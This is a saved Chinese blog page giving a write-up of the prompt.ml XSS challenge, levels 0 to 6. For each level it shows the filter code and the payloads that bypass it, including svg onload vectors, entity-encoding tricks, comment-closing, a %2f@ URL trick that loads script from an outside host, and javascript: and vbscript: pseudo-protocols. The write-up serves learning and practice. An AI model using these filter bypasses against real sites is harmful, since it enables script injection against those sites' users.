<!DOCTYPE html>

<html lang="zh-Hans">
<head>
<!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->
<meta charset="utf-8"/>
<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<meta content="telephone=no" name="format-detection">
<meta content="LoRexxar" name="author"/>
<meta content="xss挑战平台地址源码地址
规则1、成功执行prompt(1).2、payload不需要用户交互（成功会显示you won）3、payload必须对下述浏览器有效：Chrome(最新版) - Firefox(最新版) - IE10 及以上版本(或者IE10兼容模式)4、每个级别至少给出两种浏览器的答案5、字符越少越好（作为一个渣渣只能把这一条扔到一边去…)" name="description"/>
<meta content="article" property="og:type"/>
<meta content="xss无声挑战赛_writeup" property="og:title"/>
<meta content="http://lorexxar.cn/2015/07/02/xss-p/index.html" property="og:url"/>
<meta content="LoRexxar's Blog" property="og:site_name"/>
<meta content="xss挑战平台地址源码地址
规则1、成功执行prompt(1).2、payload不需要用户交互（成功会显示you won）3、payload必须对下述浏览器有效：Chrome(最新版) - Firefox(最新版) - IE10 及以上版本(或者IE10兼容模式)4、每个级别至少给出两种浏览器的答案5、字符越少越好（作为一个渣渣只能把这一条扔到一边去…)" property="og:description"/>
<meta content="2015-11-10T05:14:30.000Z" property="og:updated_time"/>
<meta content="summary" name="twitter:card"/>
<meta content="xss无声挑战赛_writeup" name="twitter:title"/>
<meta content="xss挑战平台地址源码地址
规则1、成功执行prompt(1).2、payload不需要用户交互（成功会显示you won）3、payload必须对下述浏览器有效：Chrome(最新版) - Firefox(最新版) - IE10 及以上版本(或者IE10兼容模式)4、每个级别至少给出两种浏览器的答案5、字符越少越好（作为一个渣渣只能把这一条扔到一边去…)" name="twitter:description"/>
<link href="./xss无声挑战赛_writeup  LoRexxar's Blog/apple-touch-icon.png" rel="apple-touch-icon"/>
<link href="./xss无声挑战赛_writeup  LoRexxar's Blog/atom.xml" rel="alternate" title="LoRexxar's Blog" type="application/atom+xml"/>
<link href="./xss无声挑战赛_writeup  LoRexxar's Blog/699-14040QPP9.jpg" rel="shortcut icon"/>
<link href="./xss无声挑战赛_writeup  LoRexxar's Blog/jquery.fancybox.min.css" rel="stylesheet"/>
<script src="./xss无声挑战赛_writeup  LoRexxar's Blog/pace.min.js"></script>
<link href="./xss无声挑战赛_writeup  LoRexxar's Blog/pace-theme-minimal.css" rel="stylesheet"/>
<link href="./xss无声挑战赛_writeup  LoRexxar's Blog/style.css" rel="stylesheet"/>
<link href="./xss无声挑战赛_writeup  LoRexxar's Blog/font-awesome.min.css" rel="stylesheet"/>
<title>xss无声挑战赛_writeup | LoRexxar's Blog</title>
<script src="./xss无声挑战赛_writeup  LoRexxar's Blog/jquery.min.js"></script>
<script src="./xss无声挑战赛_writeup  LoRexxar's Blog/clipboard.min.js"></script>
<script>
    var yiliaConfig = {
        fancybox: true,
        animate: false,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>
<script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>
<script> yiliaConfig.rootUrl = "\/";</script>
<script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
</meta></meta></head>
<body>
<div id="container">
<div class="left-col">
<div class="overlay"></div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="animated zoomIn" src="./xss无声挑战赛_writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/">LoRexxar</a></h1>
</hgroup>
<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
<form id="search-form">
<input autocomplete="off" autocorrect="off" class="search form-control" id="local-search-input" name="q" placeholder="search..." searchonload="false" type="text"/>
<i class="fa fa-times" onclick="resetSearch()"></i>
</form>
<div id="local-search-result"></div>
<p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
<div class="switch-btn" id="switch-btn">
<div class="icon">
<div class="icon-ctn">
<div class="icon-wrap icon-house" data-idx="0">
<div class="birdhouse"></div>
<div class="birdhouse_holes"></div>
</div>
<div class="icon-wrap icon-ribbon hide" data-idx="1">
<div class="ribbon"></div>
</div>
<div class="icon-wrap icon-link hide" data-idx="2">
<div class="loopback_l"></div>
<div class="loopback_r"></div>
</div>
<div class="icon-wrap icon-me hide" data-idx="3">
<div class="user"></div>
<div class="shoulder"></div>
</div>
</div>
</div>
<div class="tips-box hide">
<div class="tips-arrow"></div>
<ul class="tips-inner">
<li>菜单</li>
<li>标签</li>
<li>友情链接</li>
<li>关于我</li>
</ul>
</div>
</div>
<div class="switch-area" id="switch-area">
<div class="switch-wrap">
<section class="switch-part switch-part1">
<nav class="header-menu">
<ul>
<li><a href="/">主页</a></li>
<li><a href="/archives/">所有文章</a></li>
<li><a href="/tags/">标签云</a></li>
<li><a href="/about/">关于我</a></li>
</ul>
</nav>
<nav class="header-nav">
<ul class="social">
<a class="fa Email" href="/lorexxar@gmail.com" title="Email"></a>
<a class="fa 新浪微博" href="/强行被换号的LoRexxar" title="新浪微博"></a>
<a class="fa GitHub" href="https://github.com/LoRexxar" title="GitHub"></a>
<a class="fa RSS" href="/atom.xml" title="RSS"></a>
<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" title="知乎"></a>
</ul>
</nav>
</section>
<section class="switch-part switch-part2">
<div class="widget tagcloud" id="js-tagcloud">
<ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CBC/">CBC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essay/">Essay</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essry/">Essry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IPC通道入侵/">IPC通道入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LD-PRELOAD/">LD_PRELOAD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reprint/">Reprint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shadow-Brokers/">Shadow Brokers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book-notes/">book_notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bookshelf/">bookshelf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cloudeye/">cloudeye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cmd/">cmd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crontab/">crontab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csp/">csp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns/">dns</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eassy/">eassy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastcgi/">fastcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fcgi/">fcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/file-put-contents/">file_put_contents</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gopher/">gopher</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hctf/">hctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/injection/">injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lcx端口转发/">lcx端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lfi/">lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opcache/">opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pdflatex/">pdflatex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-opcache/">php opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phpmailer/">phpmailer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php伪协议/">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnhub/">pwnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rabins/">rabins</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sangebaimao/">sangebaimao</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-sock5/">ssh_sock5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/titan-souls/">titan_souls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tqdm/">tqdm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualenv/">virtualenv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/">weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/win-server信息收集/">win server信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/伪协议/">伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/参数污染/">参数污染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/格式化字符串/">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模板注入/">模板注入</a></li></ul>
</div>
</section>
<section class="switch-part switch-part3">
<div id="js-friends">
<a class="main-nav-link switch-friends-link" href="https://coding.net/u/LoRexxar">Coding</a>
<a class="main-nav-link switch-friends-link" href="https://github.com/LoRexxar">GitHub</a>
<a class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
<a class="main-nav-link switch-friends-link" href="https://wiki.hduisa.cn">HDUISA_wiki</a>
<a class="main-nav-link switch-friends-link" href="https://lightless.me/">lightless</a>
<a class="main-nav-link switch-friends-link" href="http://lazysheep.cc">Hcamael</a>
<a class="main-nav-link switch-friends-link" href="http://aklis.info/">Aklis</a>
<a class="main-nav-link switch-friends-link" href="http://libc.pw/">zh_explorer</a>
<a class="main-nav-link switch-friends-link" href="http://edwardl.xyz/">Edward_L</a>
<a class="main-nav-link switch-friends-link" href="http://evilddog.space/">evilddog</a>
<a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
<a class="main-nav-link switch-friends-link" href="http://www.nohackair.net/">Airbasic</a>
<a class="main-nav-link switch-friends-link" href="https://loli.be/">Mashiro</a>
<a class="main-nav-link switch-friends-link" href="http://www.codersec.net/">bsmali4</a>
<a class="main-nav-link switch-friends-link" href="/www.bertramc.cn">berTrAM</a>
</div>
</section>
<section class="switch-part switch-part4">
<div id="js-aboutme">带着对技术的敬畏之心成长，不安于一隅...</div>
</section>
</div>
</div>
</header>
</div>
</div>
<div class="mid-col">
<nav id="mobile-nav">
<div class="overlay">
<div class="slider-trigger"></div>
<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LoRexxar</a></h1>
</div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="animated zoomIn" src="./xss无声挑战赛_writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/" title="回到主页">LoRexxar</a></h1>
</hgroup>
<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
<nav class="header-menu">
<ul>
<li><a href="/">主页</a></li>
<li><a href="/archives/">所有文章</a></li>
<li><a href="/tags/">标签云</a></li>
<li><a href="/about/">关于我</a></li>
<div class="clearfix"></div>
</ul>
</nav>
<nav class="header-nav">
<ul class="social">
<a class="fa Email" href="/lorexxar@gmail.com" target="_blank" title="Email"></a>
<a class="fa 新浪微博" href="/强行被换号的LoRexxar" target="_blank" title="新浪微博"></a>
<a class="fa GitHub" href="https://github.com/LoRexxar" target="_blank" title="GitHub"></a>
<a class="fa RSS" href="/atom.xml" target="_blank" title="RSS"></a>
<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" target="_blank" title="知乎"></a>
</ul>
</nav>
</header>
</div>
<link about="关于我" class="menu-list" friends="友情链接" tags="标签">
</link></nav>
<div class="body-wrap"><article class="article article-type-post" id="post-xss-p" itemprop="blogPost" itemscope="">
<div class="article-meta">
<a class="article-date" href="/2015/07/02/xss-p/">
<time datetime="2015-07-02T05:48:17.000Z" itemprop="datePublished">2015-07-02</time>
</a>
</div>
<div class="article-inner">
<input class="isFancy" type="hidden"/>
<header class="article-header">
<h1 class="article-title" itemprop="name">
      xss无声挑战赛_writeup
    </h1>
</header>
<div class="article-info article-info-post">
<div class="article-category tagcloud">
<a class="article-category-link" href="/categories/Blogs/">Blogs</a>
</div>
<div class="article-tag tagcloud">
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
</div>
<div class="clearfix"></div>
</div>
<div class="article-entry" itemprop="articleBody">
<p><a href="http://prompt.ml/" rel="external" target="_blank">xss挑战平台地址</a><br/><a href="https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml" rel="external" target="_blank">源码地址</a></p>
<h1 id="规则"><a class="headerlink" href="#规则" title="规则"></a>规则</h1><p>1、成功执行prompt(1).<br/>2、payload不需要用户交互（成功会显示you won）<br/>3、payload必须对下述浏览器有效：<br/>Chrome(最新版) - Firefox(最新版) - IE10 及以上版本(或者IE10兼容模式)<br/>4、每个级别至少给出两种浏览器的答案<br/>5、字符越少越好（作为一个渣渣只能把这一条扔到一边去…)</p>
<a id="more"></a>
<h1 id="writeup"><a class="headerlink" href="#writeup" title="writeup"></a>writeup</h1><h2 id="level-0"><a class="headerlink" href="#level-0" title="level 0"></a>level 0</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> {</span></div><div class="line">    <span class="comment">// warm up</span></div><div class="line">    <span class="comment">// script should be executed without user interaction</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="</span>text<span class="string">" value="</span><span class="string">' + input + '</span><span class="string">"&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
<p>看一看发现并没有过滤任何东西，简单粗暴的svg就好了<br/><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"&gt;&lt;svg/onload="</span>prompt<span class="comment">(1)</span></div></pre></td></tr></table></figure></p>
<p>还有一些黑科技，是从官方的writeup里看到的，ie10第一加载时会用到resize事件<br/><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"onresize=prompt(1)&gt;</span></div></pre></td></tr></table></figure></p>
<p>反正我电脑中的环境是执行不了的…</p>
<h2 id="level1"><a class="headerlink" href="#level1" title="level1"></a>level1</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>{</div><div class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></div><div class="line">    <span class="comment">// Ext.util.Format.stripTags</span></div><div class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</div><div class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
<p>简单分析下，这条过滤比较常规，原则上就是如果&gt;括号存在从&lt;/\开始的都替换为空，这样想<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>都是不能用的，简单构造payload既可。<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">prompt(1)</span></span></div></pre></td></tr></table></figure></p>
<p>这里是好像是因为会自动闭合标签，所以仍然执行</p>
<h2 id="level2"><a class="headerlink" href="#level2" title="level2"></a>level2</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>{</div><div class="line">    <span class="comment">//                      v-- frowny face</span></div><div class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</div><div class="line"> </div><div class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></div><div class="line">    <span class="keyword">return</span> input;</div><div class="line">}</div></pre></td></tr></table></figure>
<p>这里过滤了（=，只要把左括号ascii编码之后就可以了，构造payload：<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这里的svg不能去掉，由于xml编码特性。在SVG向量里面的script元素（或者其他CDATA元素 ），会先进行xml解析。因此&amp;#x28（十六进制）或者&amp;#40（十进制）或者&amp;lpar；（html实体编码）会被还原成（。</p>
<p>还有一种支持es6的情况，使用eval会自动解码执行<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">${'prompt\x281)'}</span>`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="level3"><a class="headerlink" href="#level3" title="level3"></a>level3</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>{</div><div class="line">    <span class="comment">// filter potential comment end delimiters</span></div><div class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">'_'</span>);</div><div class="line"> </div><div class="line">    <span class="comment">// comment the input to avoid script execution</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
<p>源码中显示到–&gt;被过滤，但是这题需要先闭合注释框，2012年后，html标签可以用–!&gt;,于是构造payload：<br/><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">--!&gt;&lt;svg/onload=prompt(1)</span></div></pre></td></tr></table></figure></p>
<h2 id="level4"><a class="headerlink" href="#level4" title="level4"></a>level4</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>{</div><div class="line">    <span class="comment">// make sure the script belongs to own site</span></div><div class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></div><div class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) {</div><div class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">        script.src = input;</div><div class="line">        <span class="keyword">return</span> script.outerHTML;</div><div class="line">    } <span class="keyword">else</span> {</div><div class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure>
<p>题目的意思大概是必须构造一个链接，才能使得返回答案，但是这里完全看不懂，所以贴上官方的writeup，等以后能看懂的时候回忆：<br/>1、这个题目是利用url的特性绕过，浏览器支持这样的url：<a href="http://user:password@attacker.com。但是http://user:password/@attacker.com是不允许的。由于这里的正则特性和decodeURIComponent函数，所以可以使用%2f绕过，如下：http://prompt.ml%2f@attacker.com。所以域名越短，答案就越短。" rel="external" target="_blank">http://user:password@attacker.com。但是http://user:password/@attacker.com是不允许的。由于这里的正则特性和decodeURIComponent函数，所以可以使用%2f绕过，如下：http://prompt.ml%2f@attacker.com。所以域名越短，答案就越短。</a><br/><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//prompt.ml%2f<span class="meta">@ᄒ.ws/✌</span>       (这里用了<span class="meta">@的黑魔法，后面是自己xss平台的引用，直接复制是xss)</span></div></pre></td></tr></table></figure></p>
<p>2、The trick to solve the level with 17 characters only lies hidden in a transformation behavior some browsers apply when converting Unicode characters to URLs. A certain range of characters resolves to three other characters of which one is a dot - the dot we need for the URL. The following vectors uses the domain 14.rs that can be expressed by two characters only. One for the sequence 14. and one for the sequence rs:<br/><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//prompt.ml%2f@⒕₨</span></div></pre></td></tr></table></figure></p>
<p>第二会弹出来xss…因为用了别人xss平台地址</p>
<h2 id="level5"><a class="headerlink" href="#level5" title="level5"></a>level5</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">function escape(<span class="keyword">input</span>) {</div><div class="line">    <span class="comment">// apply strict filter rules of level 0</span></div><div class="line">    <span class="comment">// filter "&gt;" and event handlers</span></div><div class="line">    <span class="keyword">input</span> = <span class="keyword">input</span>.<span class="keyword">replace</span>(/&gt;|<span class="keyword">on</span>.+?=|focus/gi, '_');</div><div class="line"></div><div class="line">    <span class="keyword">return</span> '&lt;<span class="keyword">input</span> value=<span class="string">"' + input + '"</span> <span class="keyword">type</span>=<span class="string">"text"</span>&gt;';</div><div class="line">}</div></pre></td></tr></table></figure>
<p>1、首先是过滤，把onxxxx=这样的替换为_,这里用一个回车绕过。<br/>2、其次是第二点，就是后面的type不可以覆盖前面的，所以可以把type=image。<br/><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="string">"type=image src onerror</span></div><div class="line">=<span class="string">"prompt(1)</span></div></pre></td></tr></table></figure></p>
<h2 id="level6"><a class="headerlink" href="#level6" title="level6"></a>level6</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">function escape(<span class="keyword">input</span>) {</div><div class="line">    <span class="comment">// let's do a post redirection</span></div><div class="line">    try {</div><div class="line">        <span class="comment">// pass in formURL#formDataJSON</span></div><div class="line">        <span class="comment">// e.g. http://httpbin.org/post#{"name":"Matt"}</span></div><div class="line">        <span class="keyword">var</span> segments = <span class="keyword">input</span>.<span class="keyword">split</span>('#');</div><div class="line">        <span class="keyword">var</span> formURL = segments[0];</div><div class="line">        <span class="keyword">var</span> formData = JSON.<span class="keyword">parse</span>(segments[1]);</div><div class="line"></div><div class="line">        <span class="keyword">var</span> <span class="keyword">form</span> = document.createElement('<span class="keyword">form</span>');</div><div class="line">        <span class="keyword">form</span>.action = formURL;</div><div class="line">        <span class="keyword">form</span>.method = '<span class="keyword">post</span>';</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) {</div><div class="line">            <span class="keyword">var</span> <span class="keyword">input</span> = <span class="keyword">form</span>.appendChild(document.createElement('<span class="keyword">input</span>'));</div><div class="line">            <span class="keyword">input</span>.name = i;</div><div class="line">            <span class="keyword">input</span>.setAttribute('value', formData[i]);</div><div class="line">        }</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">form</span>.outerHTML + '                         \<span class="keyword">n</span>\</div><div class="line">&lt;script&gt;                                                  \<span class="keyword">n</span>\</div><div class="line">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    \n\</span></div><div class="line">    <span class="keyword">if</span> (!/script:|data:/i.<span class="keyword">test</span>(document.forms[0].action)) \<span class="keyword">n</span>\</div><div class="line">        document.forms[0].submit();                       \<span class="keyword">n</span>\</div><div class="line">    <span class="keyword">else</span>                                                  \<span class="keyword">n</span>\</div><div class="line">        document.write(<span class="string">"Action forbidden."</span>)               \<span class="keyword">n</span>\</div><div class="line">&lt;/script&gt;                                                 \<span class="keyword">n</span>\</div><div class="line">        ';</div><div class="line">    } catch (<span class="keyword">e</span>) {</div><div class="line">        <span class="keyword">return</span> 'Invalid <span class="keyword">form</span> data.';</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure>
<p>分析源码可以看到，大概是由#分割，前面赋给form.action，使method=post，后面以json格式赋给formdata，把formdata中的属性循环赋给了input。后面满足forms.action存在即执行提交，所以这里使用js伪协议。<br/><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">javascript:</span>prompt(<span class="number">1</span>)<span class="meta">#{<span class="string">"action"</span>:0}</span></div></pre></td></tr></table></figure></p>
<p>IE下可以使用vbscript减少字符<br/><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">vbscript:</span>prompt(<span class="number">1</span>)<span class="meta">#{<span class="string">"action"</span>:1}</span></div></pre></td></tr></table></figure></p>
